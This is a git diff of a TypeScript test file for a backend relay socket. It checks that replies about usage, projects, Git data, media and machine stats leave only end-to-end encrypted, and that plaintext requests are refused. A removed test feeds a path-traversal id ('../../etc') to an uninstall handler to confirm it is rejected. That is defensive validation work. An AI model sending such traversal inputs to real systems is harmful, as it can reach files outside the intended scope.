       type: 'theme_set_result', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } },
     })
     const envelope = { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } }
@@ -925,8 +1269,9 @@ describe('BackendSocket outbound queue', () => {
 
   it('answers usage_read with this machine\'s own readings, wrapped for the requester', async () => {
     // What goes back names what the person spends and on whose account, so it must leave encrypted.
-    // The reader is the socket's own field: this never touches a real home, Keychain or network.
-    const socket = new BackendSocket('token')
+    // The usage service answers it (services/usage.ts), with a reader that never touches a real home,
+    // Keychain or network.
+    const socket = relaySocket('token')
     const readings = [
       {
         provider: 'claude' as const,
@@ -936,15 +1281,15 @@ describe('BackendSocket outbound queue', () => {
         body: { seven_day: { utilization: 42 } },
       },
     ]
-    socket.accountUsageReader = async () => readings
+    serveOn(socket, (host) => host.serve('usage', (core) => startUsage(core, { read: async () => readings }), fakeCore(), USAGE_REQUESTS))
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({
       type: 'usage_read', payload: { requestId: 'usage-1' },
     })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrapReply = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrapReply = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'usage_read_result', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } },
     })
     ws.message({
@@ -963,15 +1308,16 @@ describe('BackendSocket outbound queue', () => {
     vi.spyOn(registry, 'list').mockReturnValue([{ cwd: '/remote/workspace' }] as RegisteredSession[])
     const preview = { path: '/remote/workspace', readme: 'Private project README', branch: 'main', files: ['README.md'], contributors: [] }
     const read = vi.spyOn(projectPreview, 'projectPreview').mockResolvedValue(preview)
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    serveProjects(socket)
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({ type: 'project_preview', payload: {
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({ type: 'project_preview', payload: {
       requestId: 'preview-1', path: '/remote/workspace',
     } })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrap = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrap = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'project_preview_result', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'encrypted-preview' } },
     })
     ws.message({ t: 'down', connId: 'viewer-a', frame: {
@@ -989,15 +1335,16 @@ describe('BackendSocket outbound queue', () => {
   it.each([false, true])('returns refreshed=%s Git branch choices only to the requesting encrypted connection', async refresh => {
     const preview = { isGit: true, root: '/remote/workspace', branch: 'main', branches: [{ ref: 'refs/heads/private-branch', name: 'private-branch', remote: false }] }
     const read = vi.spyOn(gitProject, 'readGitProject').mockResolvedValue(preview)
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    serveProjects(socket)
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({ type: 'git_project_info', payload: {
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({ type: 'git_project_info', payload: {
       requestId: 'preview-1', path: '/remote/workspace', refresh,
     } })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrap = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrap = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'git_project_info_result', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'encrypted-preview' } },
     })
     ws.message({ t: 'down', connId: 'viewer-a', frame: {
@@ -1016,15 +1363,16 @@ describe('BackendSocket outbound queue', () => {
   it.each([false, true])('answers scm_project_info (refresh=%s) through the SCM seam, to the requesting encrypted connection only', async refresh => {
     const preview = { kind: 'git' as const, git: { isGit: true, root: '/remote/workspace', branch: 'main', branches: [{ ref: 'refs/heads/private-branch', name: 'private-branch', remote: false }] } }
     const detect = vi.spyOn(scmProjects, 'detectScmProject').mockResolvedValue(preview)
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    serveProjects(socket)
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({ type: 'scm_project_info', payload: {
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({ type: 'scm_project_info', payload: {
       requestId: 'preview-2', path: '/remote/workspace', refresh,
     } })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrap = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrap = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'scm_project_info_result', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'encrypted-preview' } },
     })
     ws.message({ t: 'down', connId: 'viewer-a', frame: {
@@ -1042,15 +1390,16 @@ describe('BackendSocket outbound queue', () => {
 
   it('answers scm_project_info for a malformed path as the git probe does, correlated', async () => {
     const read = vi.spyOn(gitProject, 'readGitProject')
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    serveProjects(socket)
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({ type: 'scm_project_info', payload: {
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({ type: 'scm_project_info', payload: {
       requestId: 'scm-error', path: 42,
     } })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrap = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrap = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'scm_project_info_result', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'encrypted-error' } },
     })
     ws.message({ t: 'down', connId: 'viewer-a', frame: {
@@ -1065,15 +1414,16 @@ describe('BackendSocket outbound queue', () => {
     const preview = { status: 'found' as const, number: 12, state: 'Merged' as const, url: 'https://github.com/private/repo/pull/12' }
     vi.spyOn(registry, 'resolve').mockReturnValue({ cwd: '/remote/workspace' } as RegisteredSession)
     const read = vi.spyOn(gitPullRequest, 'readGitPullRequest').mockResolvedValue(preview)
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    serveProjects(socket)
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({ type: 'git_pull_request', payload: {
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({ type: 'git_pull_request', payload: {
       requestId: 'preview-1', agentId: 'agent1',
     } })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrap = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrap = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'git_pull_request_result', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'encrypted-preview' } },
     })
     ws.message({ t: 'down', connId: 'viewer-a', frame: {
@@ -1094,13 +1444,13 @@ describe('BackendSocket outbound queue', () => {
     }, history: { branches: [{ cwd: '/private/worktree', remote: null, branch: 'private-fix', at: '2026-09-27' }], pullRequests: [], truncated: false }, lookups: [], nextOffset: null }
     vi.spyOn(registry, 'resolve').mockReturnValue({ cwd: '/remote/workspace' } as RegisteredSession)
     vi.spyOn(sessionGitPullRequest, 'readSessionGitPullRequest').mockResolvedValue(history)
-    const socket = new BackendSocket('token'); socket.connect()
+    const socket = relaySocket('token'); serveProjects(socket); socket.connect()
     const ws = wsMock.instances[0]; ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({ type: 'git_pull_request', payload: {
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({ type: 'git_pull_request', payload: {
       requestId: 'history-1', agentId: 'agent1', history: true,
     } })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrap = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({ type: 'git_pull_request_result', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'encrypted-history' } } })
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrap = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({ type: 'git_pull_request_result', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'encrypted-history' } } })
     ws.message({ t: 'down', connId: 'viewer-a', frame: { type: 'git_pull_request', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'encrypted-request' } } } })
     await vi.waitFor(() => expect(wrap).toHaveBeenCalledWith('viewer-a', 'git_pull_request_result', 'history-1', history))
     expect(JSON.stringify(parseSent(ws))).not.toContain('/private/worktree')
@@ -1110,15 +1460,16 @@ describe('BackendSocket outbound queue', () => {
 
   it('returns a correlated Git error when discovery rejects or the path is malformed', async () => {
     const read = vi.spyOn(gitProject, 'readGitProject').mockRejectedValue(new Error('unavailable'))
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    serveProjects(socket)
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({ type: 'git_project_info', payload: {
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({ type: 'git_project_info', payload: {
       requestId: 'git-error', path: 42,
     } })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrap = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrap = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'git_project_info_result', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'encrypted-error' } },
     })
     ws.message({ t: 'down', connId: 'viewer-a', frame: {
@@ -1134,15 +1485,16 @@ describe('BackendSocket outbound queue', () => {
     const media = { media: true as const, filename: 'preview.png', offset: 0, totalBytes: 3,
       revision: 'a'.repeat(64), contentBase64: 'AQID' }
     const read = vi.spyOn(mediaPreview, 'readMediaPreviewChunk').mockResolvedValue(media)
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    serveProjects(socket)
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({ type: 'agent_read_file', payload: {
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({ type: 'agent_read_file', payload: {
       requestId: 'media-1', agentId: 'agent-b', path: '/tmp/preview.png', media: true, offset: 0,
     } })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrap = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrap = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'agent_read_file_result', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'encrypted-media' } },
     })
     ws.message({ t: 'down', connId: 'viewer-a', frame: {
@@ -1160,7 +1512,7 @@ describe('BackendSocket outbound queue', () => {
 
   it('refuses a plaintext media request before reading any file', async () => {
     const read = vi.spyOn(mediaPreview, 'readMediaPreviewChunk')
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
@@ -1200,15 +1552,16 @@ describe('BackendSocket outbound queue', () => {
     }
     vi.spyOn(registry, 'advertised').mockReturnValue([session])
     vi.spyOn(registry, 'terminalAvailable').mockReturnValue(true)
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindAgentList(socket)
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({
       type: 'agents_list', payload: { requestId: 'agents-1' },
     })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrapReply = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrapReply = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'agents_list_result', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } },
     })
     ws.message({
@@ -1229,18 +1582,18 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('filters and compacts the runtime catalog for a device agent', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const provider = vi.fn(async (_sessionId?: string) => [
       { id: 'runtime-v1:s1:codex:gpt-5.6-sol@high', displayName: 'GPT-5.6 Sol / High' },
       { id: 'runtime-v1:s1:codex:gpt-5.6-sol@auto', displayName: 'GPT-5.6 Sol / Auto' },
       { id: 'runtime-v1:s1:codex:o3@medium', displayName: 'o3 / Medium' },
       { id: 'runtime-v1:s1:codex:o3@auto', displayName: 'o3 / Auto' },
     ])
-    socket.runtimeModelsProvider = provider
+    serveModels(socket, { agents: { runtimeModels: provider } })
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({
       type: 'models_list',
       payload: {
         requestId: 'models-compact',
@@ -1250,8 +1603,8 @@ describe('BackendSocket outbound queue', () => {
         selectedModel: 'runtime-v1:s1:codex:gpt-5.6-sol@high',
       },
     })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
-    const wrapReply = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
+    const wrapReply = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue({
       type: 'models_list_result', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } },
     })
     ws.message({
@@ -1273,11 +1626,11 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('fails a plaintext runtime catalog request closed before reading local data', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const provider = vi.fn(async () => [
       { id: 'runtime-v1:s1:codex:gpt-5.6-sol@high', displayName: 'sensitive' },
     ])
-    socket.runtimeModelsProvider = provider
+    serveModels(socket, { agents: { runtimeModels: provider } })
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
@@ -1298,10 +1651,10 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('serves authenticated local RPCs in cleartext without weakening cloud E2EE', async () => {
-    const socket = new BackendSocket('token')
-    socket.runtimeModelsProvider = async () => [
+    const socket = relaySocket('token')
+    serveModels(socket, { agents: { runtimeModels: async () => [
       { id: 'runtime-v1:s1:codex:gpt-5.6-sol@high', displayName: 'Sol / High' },
-    ]
+    ] } })
     const frames: Array<Record<string, unknown>> = []
     expect(socket.registerLocalClient('local:test', {
       sendFrame: (frame) => { frames.push(frame); return true },
@@ -1324,9 +1677,9 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('refuses a trust-group roster swap that is not over an E2EE session (a local client has no identity)', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     const handle = vi.fn(() => ({}))
-    socket.groupSync = { handle }
+    gatewayOf(socket).groupSync = { handle }
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:group', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
     socket.handleLocalFrame('local:group', { type: 'group_sync', payload: { requestId: 'g1', members: [] } })
@@ -1341,8 +1694,8 @@ describe('BackendSocket outbound queue', () => {
     const read = vi.spyOn(machineResources, 'readMachineResources').mockImplementation(
       () => new Promise(resolve => { finish = resolve }),
     )
-    const socket = new BackendSocket('token')
-    socket.runtimeModelsProvider = async () => []
+    const socket = relaySocket('token')
+    serveMonitor(serveModels(socket))
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:stats', {
       sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true,
@@ -1371,16 +1724,17 @@ describe('BackendSocket outbound queue', () => {
   it('returns remote machine stats only in a targeted encrypted reply', async () => {
     const reading = { cpuPercent: 18, memoryUsedBytes: 10, memoryTotalBytes: 32 }
     vi.spyOn(machineResources, 'readMachineResources').mockResolvedValue(reading)
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    serveOn(socket, (host) => serveMonitor(host))
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
-    vi.spyOn(socket.e2ee, 'unwrapDown').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({
       type: 'machine_resources', payload: { requestId: 'stats' },
     })
-    vi.spyOn(socket.e2ee, 'hasSession').mockReturnValue(true)
+    vi.spyOn(gatewayOf(socket).e2ee, 'hasSession').mockReturnValue(true)
     const sealed = { type: 'machine_resources_result', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } } }
-    const wrap = vi.spyOn(socket.e2ee, 'wrapRpcReply').mockReturnValue(sealed)
+    const wrap = vi.spyOn(gatewayOf(socket).e2ee, 'wrapRpcReply').mockReturnValue(sealed)
     ws.message({
       t: 'down', connId: 'paired',
       frame: { type: 'machine_resources', payload: { __e2e: { v: 1, k: 's', n: 1, ct: 'ciphertext' } } },
@@ -1393,10 +1747,9 @@ describe('BackendSocket outbound queue', () => {
 
   it('serves per-session resource readings without blocking input or sampling system totals', async () => {
     const system = vi.spyOn(machineResources, 'readMachineResources')
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     let finish!: (value: { sampledAt: string; agents: [] }) => void
-    socket.harnessResourcesReader = vi.fn(() => new Promise<{ sampledAt: string; agents: [] }>(resolve => { finish = resolve }))
-    socket.runtimeModelsProvider = async () => []
+    serveMonitor(serveModels(socket), { resources: vi.fn(() => new Promise<{ sampledAt: string; agents: [] }>(resolve => { finish = resolve })) })
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:monitor', {
       sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true,
@@ -1414,7 +1767,7 @@ describe('BackendSocket outbound queue', () => {
 
   it('rejects unpaired plaintext stats requests before sampling the machine', async () => {
     const read = vi.spyOn(machineResources, 'readMachineResources')
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
     socket.connect()
     const ws = wsMock.instances[0]
     ws.open()
@@ -1430,50 +1783,30 @@ describe('BackendSocket outbound queue', () => {
     await socket.stop()
   })
 
-  it('dsh_remove uninstalls through the daemon and refuses a malformed id', async () => {
-    const socket = new BackendSocket('token')
-    const frames: Array<Record<string, unknown>> = []
-    socket.registerLocalClient('local:store', { sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true })
-    const removed: string[] = []
-    socket.onDshRemove = (id) => { removed.push(id); return id === 'autonomous/marp' ? { ok: true } : { ok: false, error: 'NOT_INSTALLED', detail: `${id} is not installed` } }
-
-    socket.handleLocalFrame('local:store', { type: 'dsh_remove', payload: { requestId: 'rm-1', id: 'autonomous/marp' } })
-    socket.handleLocalFrame('local:store', { type: 'dsh_remove', payload: { requestId: 'rm-2', id: 'autonomous/none' } })
-    socket.handleLocalFrame('local:store', { type: 'dsh_remove', payload: { requestId: 'rm-3', id: '../../etc' } })
-
-    await vi.waitFor(() => expect(frames.filter((f) => f.type === 'dsh_remove_result')).toHaveLength(3))
-    const results = frames.filter((f) => f.type === 'dsh_remove_result').map((f) => f.payload as Record<string, unknown>)
-    expect(results).toEqual([
-      expect.objectContaining({ requestId: 'rm-1', ok: true, id: 'autonomous/marp' }),
-      expect.objectContaining({ requestId: 'rm-2', error: 'NOT_INSTALLED' }),
-      expect.objectContaining({ requestId: 'rm-3', error: 'INVALID_DSH' }),
-    ])
-    expect(removed).toEqual(['autonomous/marp', 'autonomous/none'])
-    await socket.unregisterLocalClient('local:store')
-    await socket.stop()
-  })
-
-  it('serves live catalog entries without making unrelated RPCs wait for catalog I/O', async () => {
-    let finish!: (entries: Awaited<ReturnType<typeof storeCatalog.refreshDshRegistry>>) => void
-    vi.spyOn(storeCatalog, 'refreshDshRegistry').mockImplementation(() => new Promise(resolve => { finish = resolve }))
-    const socket = new BackendSocket('token')
-    socket.runtimeModelsProvider = async () => []
+  it('never holds a connection\'s next request for a service still answering one', async () => {
+    const socket = relaySocket('token')
+    const models = serveModels(socket)
+    let answerCatalog!: (result: Record<string, unknown>) => void
+    socket.serviceRouter = (type, payload, asker, reply) => {
+      if (type !== 'dsh_list') return models.route(type, payload, asker, reply)
+      answerCatalog = reply
+      return true
+    }
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:catalog', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
     socket.handleLocalFrame('local:catalog', { type: 'dsh_list', payload: { requestId: 'catalog' } })
     socket.handleLocalFrame('local:catalog', { type: 'models_list', payload: { requestId: 'models' } })
     await vi.waitFor(() => expect(frames.some(frame => frame.type === 'models_list_result')).toBe(true))
     expect(frames.some(frame => frame.type === 'dsh_list_result')).toBe(false)
-    finish([{ id: 'acme/published-today', name: 'Published today', engine: 'claude', repo: 'https://example.test/project', tier: 2, viewerUse: 'acme/viewer' }])
-    await vi.waitFor(() => expect(frames).toContainEqual({
-      type: 'dsh_list_result', payload: { requestId: 'catalog', dsh: [expect.objectContaining({ id: 'acme/published-today', installed: false, viewerUse: 'acme/viewer' })] },
-    }))
+    answerCatalog({ dsh: [] })
+    await vi.waitFor(() => expect(frames).toContainEqual({ type: 'dsh_list_result', payload: { requestId: 'catalog', dsh: [] } }))
     await socket.unregisterLocalClient('local:catalog')
     await socket.stop()
   })
 
   it('does not let a slow engines_probe block agent_create on the same connection', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:create', {
       sendFrame: (frame) => { frames.push(frame); return true },
@@ -1509,7 +1842,8 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('opens a harness on a conversation Harness did not start, and refuses what a resume cannot take', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:resume', {
       sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true,
@@ -1544,7 +1878,8 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('creates with approvals bypassed unless the client turns that off', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:bypass', {
       sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true,
@@ -1586,7 +1921,8 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('creates a terminal with no folder at home, and refuses it a grid or a project to prepare', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:terminal', {
       sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true,
@@ -1623,7 +1959,8 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('recovers a delayed creation on the same connection without starting another agent', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:receipt', {
       sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true,
@@ -1684,7 +2021,8 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('explains invalid repository choices without echoing credentials or preparing a folder', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:invalid-project', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
     const prepare = vi.spyOn(projectFolder, 'prepareProjectFolder')
@@ -1713,7 +2051,8 @@ describe('BackendSocket outbound queue', () => {
     { projectSource: 'worktree', gitSource: '/remote/repo', branchRef: 'refs/heads/main' },
     { projectSource: 'branch', gitSource: '/remote/repo', branchRef: 'refs/heads/feature' },
   ])('prepares $projectSource once under its creation receipt and retains its folder after a refused launch', async (project) => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:project', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
     let finish!: (folder: string) => void
@@ -1756,7 +2095,8 @@ describe('BackendSocket outbound queue', () => {
     { name: 'a worktree of a repo Claude already trusts', project: { projectSource: 'worktree', gitSource: '/work/repo', branchRef: 'refs/heads/main' }, sourceTrusted: true, trusts: true },
   ])('records Claude trust for $name: $trusts', async ({ project, sourceTrusted, trusts }) => {
     // Only a folder the daemon made empty, or a worktree of a repo already trusted, is trusted for the person.
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:trust', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
     vi.spyOn(projectFolder, 'prepareProjectFolder').mockResolvedValue('/work/prepared')
@@ -1788,7 +2128,8 @@ describe('BackendSocket outbound queue', () => {
     mkdirSync(dir, { recursive: true })
     for (const item of contents) writeFileSync(join(dir, item), 'x')
     vi.spyOn(projectFolder, 'projectsRoot').mockReturnValue(root)
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     socket.registerLocalClient('local:cwd-trust', { sendFrame: () => true, sendBinary: () => true })
     vi.mocked(claudeTrust.preTrustClaudeProject).mockClear()
     socket.onCreateAgent = vi.fn(async () => ({ ok: false as const, error: 'TMUX_UNAVAILABLE' }))
@@ -1812,18 +2153,19 @@ describe('BackendSocket outbound queue', () => {
     const dir = join(root, 'workspace')
     mkdirSync(dir)
     vi.spyOn(projectFolder, 'projectsRoot').mockReturnValue(root)
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const internals = socket as unknown as {
       e2ee: { unwrapDown: (connId: string, frame: unknown) => unknown }
       dispatchDown: (frame: unknown, connId: string, transport: string) => Promise<void>
     }
-    vi.spyOn(internals.e2ee, 'unwrapDown').mockReturnValue({
+    vi.spyOn(gatewayOf(socket).e2ee, 'unwrapDown').mockReturnValue({
       type: 'agent_create', payload: { requestId: 'r', creationId: randomUUID(), engine: 'claude', cwd: dir },
     })
     vi.mocked(claudeTrust.preTrustClaudeProject).mockClear()
     socket.onCreateAgent = vi.fn(async () => ({ ok: false as const, error: 'TMUX_UNAVAILABLE' }))
     try {
-      await internals.dispatchDown({ type: 'agent_create', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'fixture' } } }, 'web-1', 'relay')
+      await dispatchDown(socket, { type: 'agent_create', payload: { __e2e: { v: 1, k: 'p', n: 1, ct: 'fixture' } } }, 'web-1', 'relay')
       // The create ran, so the pre-trust branch was reached and declined — not skipped earlier by the gate.
       await vi.waitFor(() => expect(socket.onCreateAgent).toHaveBeenCalled())
       expect(claudeTrust.preTrustClaudeProject).not.toHaveBeenCalled()
@@ -1834,7 +2176,8 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('hands the launch the SCM record the prepared workspace reported, and none for a folder no SCM made', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:scm', { sendFrame: frame => { frames.push(frame); return true }, sendBinary: () => true })
     const prepare = vi.spyOn(projectFolder, 'prepareProjectFolder').mockImplementation(async (project, options) => {
@@ -1865,7 +2208,8 @@ describe('BackendSocket outbound queue', () => {
   })
 
   it('checks an unknown creation without spawning and rejects malformed creation ids before launch', async () => {
-    const socket = new BackendSocket('token')
+    const socket = relaySocket('token')
+    bindLaunchRequests(socket)
     const frames: Array<Record<string, unknown>> = []
     socket.registerLocalClient('local:missing-receipt', {
       sendFrame: (frame) => { frames.push(frame); return true }, sendBinary: () => true,
@@ -1898,7 +2242,8 @@ describe('BackendSocket outbound queue', () => {
     ['SPAWN_FAILED', 'unconfirmed'],
     ['REGISTRATION_FAILED', 'unconfirmed'],
   ])('does not relaunch a recorded %s outcome', async (error, state) => {
